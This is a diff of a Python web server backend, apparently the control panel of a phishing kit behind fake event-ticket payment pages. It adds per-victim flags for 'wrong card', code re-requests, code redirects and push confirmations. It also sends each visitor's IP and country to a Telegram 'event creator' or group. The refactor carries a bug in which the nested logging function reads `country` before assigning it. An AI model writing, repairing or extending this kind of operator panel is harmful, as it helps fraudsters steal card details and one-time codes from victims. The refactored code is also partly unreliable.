@@ -73,20 +73,17 @@ COUNTRY_NAMES = {
     # ... додайте інші країни за потреби ...
 }
 
-# --- In-memory storage for request_again flags ---
-REQUEST_AGAIN_FLAGS = {}
-# --- In-memory blacklist and wrong_card flags ---
-BLACKLISTED_IPS = set()
-WRONG_CARD_FLAGS = {}
-CODE_REDIRECT_FLAGS = {}
-# --- In-memory storage for custom texts ---
-CUSTOM_TEXTS = {}
-# --- In-memory storage for support flags ---
-SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
-# --- In-memory storage for push flags ---
-PUSH_FLAGS = {}
-# Глобальные переменные для флагов
-USER_SESSIONS = {}  # ip: timestamp для отслеживания сессий
+# Глобальні змінні для флагів
+SUPPORT_FLAGS = {}  # {ip: {'support': True, 'text_id': 'id', 'used': False}}
+PUSH_FLAGS = {}     # {page_code: {'used': False}}
+USER_SESSIONS = {}  # {ip: timestamp}
+CUSTOM_TEXTS = {}   # {text_id: text}
+REQUEST_AGAIN_FLAGS = {}  # {code: True/False}
+WRONG_CARD_FLAGS = {}     # {ip: True/False}
+CODE_REDIRECT_FLAGS = {}  # {ip: True/False}
+BLACKLISTED_IPS = set()   # set of blocked IPs
+PAYMENT_DISABLED = False  # глобальний флаг для блокування платежів
+
 # --- In-memory storage for ignoring first visit to new pages ---
 IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу
 
@@ -108,32 +105,31 @@ def is_telegram_request(user_agent):
     user_agent_lower = user_agent.lower()
     return any(indicator.lower() in user_agent_lower for indicator in telegram_indicators)
 
+# Функція для очищення старих флагів
 def clear_old_flags():
-    """Очищает старые флаги для неактивных пользователей"""
     current_time = time.time()
-    expired_ips = []
-    
-    # Очищаем старые сессии
-    for ip, timestamp in USER_SESSIONS.items():
-        if current_time - timestamp > 300:  # 5 минут
-            expired_ips.append(ip)
-    
-    # Удаляем старые сессии
+    # Очищаємо флаги старше 10 хвилин
+    expired_ips = [ip for ip, timestamp in USER_SESSIONS.items() if current_time - timestamp > 600]
     for ip in expired_ips:
-        del USER_SESSIONS[ip]
         if ip in SUPPORT_FLAGS:
             del SUPPORT_FLAGS[ip]
-            print(f"[clear_old_flags] Cleared expired session and flags for IP: {ip}")
+        if ip in USER_SESSIONS:
+            del USER_SESSIONS[ip]
+        if ip in WRONG_CARD_FLAGS:
+            del WRONG_CARD_FLAGS[ip]
+        if ip in CODE_REDIRECT_FLAGS:
+            del CODE_REDIRECT_FLAGS[ip]
     
-    # Очищаем push флаги старше 5 минут
-    expired_pages = []
-    for page_code, timestamp in PUSH_FLAGS.items():
-        if isinstance(timestamp, (int, float)) and current_time - timestamp > 300:
-            expired_pages.append(page_code)
-    
-    for page_code in expired_pages:
+    # Очищаємо push флаги старше 5 хвилин
+    expired_page_codes = [page_code for page_code, flag_data in PUSH_FLAGS.items() 
+                         if isinstance(flag_data, dict) and flag_data.get('used', True)]
+    for page_code in expired_page_codes:
         del PUSH_FLAGS[page_code]
-        print(f"[clear_old_flags] Cleared expired push flag for page_code: {page_code}")
+    
+    # Очищаємо request_again флаги старше 2 хвилин
+    expired_codes = [code for code, flag in REQUEST_AGAIN_FLAGS.items() if not flag]
+    for code in expired_codes:
+        del REQUEST_AGAIN_FLAGS[code]
 
 # --- Додаю функцію для ігнорування першого переходу ---
 def add_ignore_first_visit(page_code):
@@ -143,7 +139,7 @@ def add_ignore_first_visit(page_code):
         print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")
 
 # --- Глобальний флаг для платіжки ---
-PAYMENT_DISABLED = False
+# PAYMENT_DISABLED = False # This line is removed as it's now a global variable
 
 # --- Logging setup ---
 logging.basicConfig(
@@ -166,26 +162,106 @@ def log_function(func):
             raise
     return wrapper
 
-def get_country_by_ip(ip):
-    """Отримує країну за IP адресою"""
-    try:
-        print(f"[DEBUG] Getting country for IP: {ip}")
-        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
-        if resp.status_code == 200:
-            data = resp.json()
-            country_code = data.get("country", "")
-            print(f"[DEBUG] IPinfo response for {ip}: {data}")
-            print(f"[DEBUG] Country code: {country_code}")
+# --- Логування setup ---
+def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, important=False):
+    """Асинхронно надсилає лог в Telegram"""
+    def send_log():
+        try:
+            # Отримуємо країну якщо не передана
+            if not country:
+                country = get_country_by_ip(ip)
             
-            # Перетворюємо код країни на повну назву
-            country_full = COUNTRY_NAMES.get(country_code, country_code)
-            print(f"[DEBUG] Country full name: {country_code} -> {country_full}")
+            # Формуємо повідомлення
+            if extra_user_id:
+                message = (
+                    f"🎫 Новий перехід на сайт\n"
+                    f"📄 Сторінка: {page}\n"
+                    f"🔗 Посилання: {link}\n"
+                    f"🌍 IP: {ip}\n"
+                    f"🏳️ Країна: {country}\n"
+                    f"👤 Event Creator ID: {extra_user_id}"
+                )
+                # Надсилаємо event creator
+                send_telegram_message_to_user(extra_user_id, message)
+            else:
+                # Надсилаємо в групу тільки важливі повідомлення
+                if important:
+                    message = (
+                        f"🚨 Важлива дія\n"
+                        f"📄 Сторінка: {page}\n"
+                        f"🌍 IP: {ip}\n"
+                        f"🏳️ Країна: {country}"
+                    )
+                    send_telegram_message_to_group(message)
+        except Exception as e:
+            print(f"[Telegram Log Error] {e}")
+    
+    # Запускаємо в окремому потоці
+    import threading
+    thread = threading.Thread(target=send_log)
+    thread.daemon = True
+    thread.start()
+
+def send_telegram_message_to_user(user_id, message):
+    """Надсилає повідомлення конкретному користувачу"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            'chat_id': user_id,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        response = requests.post(url, json=data, timeout=5)
+        if response.status_code == 200:
+            print(f"✅ Повідомлення надіслано користувачу {user_id}")
+        else:
+            print(f"❌ Помилка надсилання користувачу {user_id}: {response.status_code}")
+    except Exception as e:
+        print(f"❌ Помилка Telegram API для користувача {user_id}: {e}")
+
+def send_telegram_message_to_group(message):
+    """Надсилає повідомлення в групу"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            'chat_id': GROUP_ID, # Changed from ADMIN_GROUP_ID to GROUP_ID
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        response = requests.post(url, json=data, timeout=5)
+        if response.status_code == 200:
+            print(f"✅ Повідомлення надіслано в групу")
+        else:
+            print(f"❌ Помилка надсилання в групу: {response.status_code}")
+    except Exception as e:
+        print(f"❌ Помилка Telegram API для групи: {e}")
+
+# --- Оптимізована функція отримання країни ---
+def get_country_by_ip(ip):
+    """Отримує країну за IP з кешу або API"""
+    if not ip or ip in ['127.0.0.1', 'localhost', '::1']:
+        return "Local"
+    
+    # Перевіряємо кеш
+    if hasattr(get_country_by_ip, 'cache') and ip in get_country_by_ip.cache:
+        return get_country_by_ip.cache[ip]
+    
+    try:
+        response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
+        if response.status_code == 200:
+            data = response.json()
+            country_code = data.get('country', 'Unknown')
+            country_full = data.get('country_name', country_code)
+            
+            # Кешуємо результат
+            if not hasattr(get_country_by_ip, 'cache'):
+                get_country_by_ip.cache = {}
+            get_country_by_ip.cache[ip] = country_full
+            
             return country_full
         else:
-            print(f"[DEBUG] IPinfo error for {ip}: status {resp.status_code}")
             return "Unknown"
-    except Exception as e:
-        print(f"[DEBUG] Error getting country for {ip}: {e}")
+    except Exception:
         return "Unknown"
 
 def is_api_request(path):
@@ -327,21 +403,6 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
 
-def send_telegram_log_async(page, link, ip, country="", extra_user_id=None, important=False):
-    try:
-        threading.Thread(
-            target=send_telegram_log,
-            args=(page, link, ip, country, extra_user_id, important),
-            daemon=True
-        ).start()
-    except Exception as e:
-        print(f"[async_log] Failed to start log thread: {e}")
-        # Якщо асинхронне логування не вдалося, спробуємо синхронно
-        try:
-            send_telegram_log(page, link, ip, country, extra_user_id, important)
-        except Exception as e2:
-            print(f"[sync_log] Failed to send log synchronously: {e2}")
-
 def get_real_ip(handler):
     xff = handler.headers.get('X-Forwarded-For')
     if xff:
@@ -408,7 +469,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write('<html><body><h2>Your IP has been blocked by the administrator.</h2></body></html>'.encode('utf-8'))
             return
-        print(f"GET: {self.path}")  # Логування всіх GET-запитів
+        # Логуємо тільки важливі запити
+        if not is_api_request(self.path):
+            print(f"GET: {self.path}")
         path = unquote(self.path.split('?', 1)[0])
         orig_path = path
         # Якщо файл не знайдено, але є параметри — повертаємо index.html з відповідної папки
@@ -457,11 +520,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         if not is_telegram and is_real_page:
             ip = get_real_ip(self)
-            print(f"📝 Запит на сторінку: {orig_path} від IP: {ip}")
+            # Логуємо тільки важливі запити
+            if not orig_path.startswith('/api/'):
+                print(f"📝 Запит на сторінку: {orig_path} від IP: {ip}")
         elif is_telegram:
-            print(f"🚫 Telegram запит - не логуємо: {orig_path}")
+            pass  # Не логуємо Telegram запити
         elif not is_real_page:
-            print(f"ℹ️ API/ресурс запит - не логуємо: {orig_path}")
+            pass  # Не логуємо API/ресурси
         # --- NEW: If ?page=page_code in URL, update IP in database ---
         page_code_for_ip = None
         if 'page' in qs:
@@ -531,10 +596,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Логуємо для event creator ТІЛЬКИ якщо це сторінка з його page_code
         if extra_user_id and not is_telegram and should_log and page_code:
-            print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path} (user_id: {extra_user_id}, page_code: {page_code})")
             # Отримуємо країну за IP
             country = get_country_by_ip(ip)
-            print(f"🌍 Країна для event creator: {country}")
             # Non-blocking log
             send_telegram_log_async(
                 page=norm_path,
@@ -544,13 +607,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 extra_user_id=extra_user_id
             )
         elif is_telegram:
-            print(f"🚫 Telegram запит - не логуємо для event creator: {norm_path}")
+            pass  # Не логуємо Telegram запити
         elif extra_user_id and not should_log:
-            print(f"ℹ️ Event creator є, але це не сторінка: {norm_path}")
+            pass  # Не логуємо не-сторінки
         elif extra_user_id and not page_code:
-            print(f"ℹ️ Event creator є, але немає page_code: {norm_path}")
+            pass  # Не логуємо без page_code
         else:
-            print(f"ℹ️ Немає event creator для сторінки: {norm_path}")
+            pass  # Не логуємо зайві повідомлення
         
         # Група та адмін — логуємо тільки реальні сторінки та не Telegram, АЛЕ НЕ якщо це вже залоговано для event creator
         if should_log and not should_ignore_first_visit and not is_telegram and not extra_user_id:
@@ -558,40 +621,37 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.server.logged_paths = set()
             if norm_path not in self.server.logged_paths:
                 self.server.logged_paths.add(norm_path)
-                print(f"📝 Логуємо відкриття сторінки в групу: {norm_path}")
                 # Отримуємо країну за IP
                 country = get_country_by_ip(ip)
-                print(f"🌍 Країна для групи: {country}")
-                # Non-blocking log
+                # Non-blocking log - тільки важливі повідомлення
                 send_telegram_log_async(
                     page=norm_path,
                     link=self.path,
                     ip=ip,
-                    country=country
+                    country=country,
+                    important=True  # Тільки важливі повідомлення
                 )
-            else:
-                print(f"ℹ️ Сторінка вже залогована: {norm_path}")
+            # else:
+            #     pass  # Не логуємо повторно
         elif is_telegram:
-            print(f"🚫 Telegram запит - не логуємо в групу: {norm_path}")
+            pass  # Не логуємо Telegram запити
         elif should_ignore_first_visit:
-            print(f"⏭️ Ігноруємо перший перехід для: {norm_path} (page_code: {page_code})")
+            pass  # Не логуємо перший перехід
         elif not should_log:
-            print(f"ℹ️ Не логуємо - не сторінка: {norm_path}")
+            pass  # Не логуємо не-сторінки
         elif extra_user_id:
-            print(f"ℹ️ Не логуємо в групу - вже залоговано для event creator: {norm_path}")
+            pass  # Не логуємо в групу - вже залоговано для event creator
         
         # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
         if should_ignore_first_visit:
             IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
-            print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
-            print(f"📊 Поточний список ігнорування: {list(IGNORE_FIRST_VISIT_PAGE_CODES)}")
+            # print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
+            # print(f"📊 Поточний список ігнорування: {list(IGNORE_FIRST_VISIT_PAGE_CODES)}")
         # --- Додаємо обробку /check_request_again ---
         if self.path.startswith('/check_request_again'):
             code = qs.get('code', [None])[0]
-            print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
             if code and REQUEST_AGAIN_FLAGS.get(code):
                 REQUEST_AGAIN_FLAGS[code] = False
-                print(f"[check_request_again][GET] Returning true for code: {code}")
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'true')
@@ -635,50 +695,50 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write((text or '').encode('utf-8'))
             return
         if self.path.startswith('/check_support'):
-            # Очищаем старые флаги
+            # Очищаємо старі флаги
             clear_old_flags()
             
             ip = qs.get('ip', [None])[0]
             current_time = time.time()
             
-            # Сбрасываем флаги для новых пользователей (если IP не был активен в последние 5 минут)
+            # Скидаємо флаги для нових користувачів (якщо IP не був активний в останні 5 хвилин)
             if ip in USER_SESSIONS:
                 session_age = current_time - USER_SESSIONS[ip]
-                if session_age > 300:  # 5 минут
+                if session_age > 300:  # 5 хвилин
                     if ip in SUPPORT_FLAGS:
                         del SUPPORT_FLAGS[ip]
-                        print(f"[check_support] Reset flags for new user session: {ip}")
+                        print(f"[check_support] Скинуто флаги для нового сеансу користувача: {ip}")
             else:
-                # Если это первый раз для этого IP, очищаем старые флаги
+                # Якщо це перший раз для цього IP, очищаємо старі флаги
                 if ip in SUPPORT_FLAGS:
                     del SUPPORT_FLAGS[ip]
-                    print(f"[check_support] First time for IP, cleared flags: {ip}")
+                    print(f"[check_support] Перший раз для IP, очищено флаги: {ip}")
             
-            # Обновляем время сессии
+            # Оновлюємо час сесії
             USER_SESSIONS[ip] = current_time
             
             flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
-            print(f"[check_support] IP: {ip}, flags: {flag}")
+            print(f"[check_support] IP: {ip}, флаги: {flag}")
             
-            # ВАЖНО: Проверяем флаг и помечаем как использованный
+            # Перевіряємо флаг і позначаємо як використаний
             response_data = {
                 'show_support': bool(flag.get('support') and not flag.get('used', True)),
                 'show_text': bool(flag.get('text_id') and not flag.get('used', True)),
                 'text_id': flag.get('text_id', '') if not flag.get('used', True) else ''
             }
             
-            # Помечаем флаг как использованный или удаляем
+            # Позначаємо флаг як використаний або видаляємо
             if flag.get('support') or flag.get('text_id'):
                 if not flag.get('used', True):
-                    # Помечаем как использованный
+                    # Позначаємо як використаний
                     SUPPORT_FLAGS[ip] = {**flag, 'used': True}
-                    print(f"[check_support] Flag marked as used for IP: {ip}")
+                    print(f"[check_support] Флаг позначено як використаний для IP: {ip}")
                 else:
-                    # Удаляем использованный флаг
+                    # Видаляємо використаний флаг
                     del SUPPORT_FLAGS[ip]
-                    print(f"[check_support] Used flag cleared for IP: {ip}")
+                    print(f"[check_support] Використаний флаг очищено для IP: {ip}")
             
-            print(f"[check_support] Response: {response_data}")
+            print(f"[check_support] Відповідь: {response_data}")
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
@@ -695,20 +755,20 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         if self.path.startswith('/check_push'):
             page_code = qs.get('page_code', [None])[0]
-            print(f'[check_push] page_code: {page_code}, flag: {PUSH_FLAGS.get(page_code)}')
+            print(f'[check_push] page_code: {page_code}, флаг: {PUSH_FLAGS.get(page_code)}')
             if page_code and page_code in PUSH_FLAGS:
                 flag_data = PUSH_FLAGS[page_code]
                 if isinstance(flag_data, dict) and not flag_data.get('used', True):
-                    # Помечаем как использованный
+                    # Позначаємо як використаний
                     PUSH_FLAGS[page_code] = {'used': True}
-                    print(f'[check_push] Push flag used for page_code: {page_code}')
+                    print(f'[check_push] Push флаг використано для page_code: {page_code}')
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'true')
                 else:
-                    # Удаляем использованный флаг
+                    # Видаляємо використаний флаг
                     del PUSH_FLAGS[page_code]
-                    print(f'[check_push] Push flag cleared for page_code: {page_code}')
+                    print(f'[check_push] Push флаг очищено для page_code: {page_code}')
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'false')
@@ -1064,26 +1124,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 ip = data.get('ip')
                 flag_type = data.get('type')  # 'support' або 'text'
                 text_id = data.get('text_id')
-                print(f"[set_support_flag] IP: {ip}, type: {flag_type}, text_id: {text_id}")
+                print(f"[set_support_flag] IP: {ip}, тип: {flag_type}, text_id: {text_id}")
                 
-                # Очищаем старые флаги
+                # Очищаємо старі флаги
                 clear_old_flags()
                 
-                # Очищаем ВСЕ старые флаги перед установкой нового
+                # Очищаємо ВСІ старі флаги перед установкой нового
                 SUPPORT_FLAGS.clear()
-                print(f"[set_support_flag] Cleared all old support flags")
+                print(f"[set_support_flag] Очищено всі старі support флаги")
                 
                 if ip and flag_type == 'support':
                     SUPPORT_FLAGS[ip] = {'support': True, 'used': False}
-                    print(f"[set_support_flag] Set support flag ONLY for IP: {ip}")
+                    print(f"[set_support_flag] Встановлено support флаг ТІЛЬКИ для IP: {ip}")
                 elif ip and flag_type == 'text' and text_id:
                     SUPPORT_FLAGS[ip] = {'text_id': text_id, 'used': False}
-                    print(f"[set_support_flag] Set text flag ONLY for IP: {ip} with text_id: {text_id}")
+                    print(f"[set_support_flag] Встановлено text флаг ТІЛЬКИ для IP: {ip} з text_id: {text_id}")
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'ok')
             except Exception as e:
-                print(f"[set_support_flag] Error: {e}")
+                print(f"[set_support_flag] Помилка: {e}")
                 self.send_response(500)
                 self.end_headers()
                 self.wfile.write(b'error')
@@ -1142,14 +1202,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 data = json.loads(post_data)
                 page_code = data.get('page_code')
                 if page_code:
-                    # Очищаем старые флаги
+                    # Очищаємо старі флаги
                     clear_old_flags()
-                    # Очищаем ВСЕ старые push флаги перед установкой нового
+                    # Очищаємо ВСІ старі push флаги перед установкой нового
                     PUSH_FLAGS.clear()
-                    print(f'[set_push_flag] Cleared all old push flags')
+                    print(f'[set_push_flag] Очищено всі старі push флаги')
                     
                     PUSH_FLAGS[page_code] = {'used': False}
-                    print(f'[set_push_flag] Set push flag ONLY for page_code: {page_code}')
+                    print(f'[set_push_flag] Встановлено push флаг ТІЛЬКИ для page_code: {page_code}')
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'ok')
